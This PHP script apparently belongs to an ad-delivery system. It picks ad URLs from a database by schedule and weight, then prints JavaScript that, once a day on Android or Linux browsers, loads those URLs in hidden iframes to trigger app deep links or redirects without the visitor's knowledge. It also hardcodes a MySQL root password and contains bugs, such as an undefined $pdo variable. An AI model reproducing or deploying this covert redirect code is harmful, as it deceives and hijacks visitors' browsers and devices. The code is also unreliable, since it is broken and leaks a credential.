<?php
/**
 * Created by PhpStorm.
 * User: Administrator
 * Date: 2018/10/9 0009
 * Time: 17:28
 */
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('PRC');//校正时间

//连接数据库
try{
    $spdo = new PDO('mysql:host=127.0.0.1;dbname=lezunsys;port=3306','root','xya197a3321');
    $spdo->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
    $spdo->exec('set names utf8');
}catch(PDOException $e){
    // echo '数据库连接失败'.$e->getMessage();
}

$sql = $pdo->prepare(' SELECT a.pro_id,b.url_id,b.url,b.percent,b.checkplan,b.delivery_mode FROM
                      lz_bigclick_cpm_product AS a LEFT JOIN  lz_bigclick_cpm_url_copy AS b ON a.pro_id=b.pro_id
                      WHERE a.pro_type IN (1,2) AND a.status=1 AND b.status=1 ORDER BY a.pro_id');
$sql->execute();
$res = $sql->fetchAll();

$date = array();
foreach($res as $key => $value){
    if(!empty($value['url_id'])){
        $date[$value['pro_id']][$value['url_id']] = $value;
    }

}

$url = array();
$schemas = '';
foreach($date as $key => $value){//产品循环
    foreach($value as $k => $v){//产品下链接循环
        //反序列化链接发送规则
        $checkplan = unserialize($v['checkplan']);
        if($v['delivery_mode'] == 1){
            $startDay = strtotime($checkplan['start_day']);//开始日期时间戳
            $revolution = $checkplan['revolution'];//周期
            $hour = implode(',',$checkplan['hour']);
            //判断日期和小时是否满足，若满足，放入数组中，单产品下所有符合规则的链接做不放回抽奖
            $today = strtotime(date("Y-m-d"),time());//今日0点时间戳
            if(($today - $startDay)/86400 % $revolution == 0){
                if(!(strpos($hour,date("H")) === false)){
                    $url[$k]['post_type'] = $v['post_type'];
                    $url[$k]['url'] = $v['url'];
                    $url[$k]['percent'] = $v['percent'];
                }
            }
        }else{
            $day = implode(',',$checkplan['day']);
            $hour = implode(',',$checkplan['hour']);

            //判断日期和小时是否满足，若满足，放入数组中，单产品下所有符合规则的链接做不放回抽奖
            if(!(strpos($day,date("d")) === false)){
                if(!(strpos($hour,date("H")) === false)){
                    $url[$k]['post_type'] = $v['post_type'];
                    $url[$k]['url'] = $v['url'];
                    $url[$k]['percent'] = $v['percent'];
                }
            }
        }
    }
    $proSum = 100;$rs = '';
    foreach($url as $k => $v){
        $randNum = rand(1, $proSum);
        if ($randNum <= $v['percent']) {
            $schemas = $schemas.';;;'.$v['url'];
            break;
        } else {
            $proSum -= $v['percent'];
        }
    }
    $url = array();
}

$schemas = explode(';;;',substr($schemas, 3));
$schemas = json_encode($schemas,JSON_UNESCAPED_UNICODE);
$schemas = str_replace("&amp;","&",$schemas);
echo 'var schemas =';
echo $schemas;
echo ';
    function cookieGO(name) {
        var today = new Date();
        var expires = new Date();
        expires.setTime(today.getTime() + 1000*60*60*24);
        setCookie("cookievalueee", name, expires);
    }

    function setCookie(name, value, expire) {
        window.document.cookie = name + "=" + escape(value) + ((expire == null) ? "" : ("; expires=" + expire.toGMTString()));
    }

    function getCookie(Name) {
        var findcookie = Name + "=";
        if (window.document.cookie.length > 0) { // if there are any cookies
            offset = window.document.cookie.indexOf(findcookie);
            if (offset != -1) { // cookie exists  存在
                offset += findcookie.length;          // set index of beginning of value
                end = window.document.cookie.indexOf(";", offset);          // set index of end of cookie value
                if (end == -1)
                    end = window.document.cookie.length;
                return unescape(window.document.cookie.substring(offset, end));
            }
        }
        return null;
    }
    var c = getCookie("cookievalueee");
    if (c == null) {
        (function(a, d, b, e) {
            if (/android|linux/i.test(d.userAgent.toLowerCase())){
                try {
                    for (var i=0;i<a.length;i++) {
                        if(a[i]!=""){
                            var c = b.createElement("iframe");
                            c.src = a[i];
                            c.style.display = "none";
                            b.body.appendChild(c);
                        }
                    }
                } catch (g) {}
            }
        }) (schemas, navigator, document, window.location);
        cookieGO("getcookieee");
    }';

//统计到log
$logday = date('Ymd');
if (!file_exists('/tmp/siqiyi182log/')){
    mkdir ('/tmp/siqiyi182log/',0755,true);
}
$log_test_file = '/tmp/siqiyi182log/'.$logday.'.log';
$log_test_str = "1\n";
writeFileForPv($log_test_file,$log_test_str);
//统计专用写日志
function writeFileForPv($file,$str,$mode='a+')
{
    $oldmask = @umask(0);
    $fp = @fopen($file, $mode);
    // @flock($fp, 3);
    if (!$fp) {

    } else {
        @fwrite($fp, $str);
        @fclose($fp);
        // @umask($oldmask);
        // Return true;
    }
}
?>
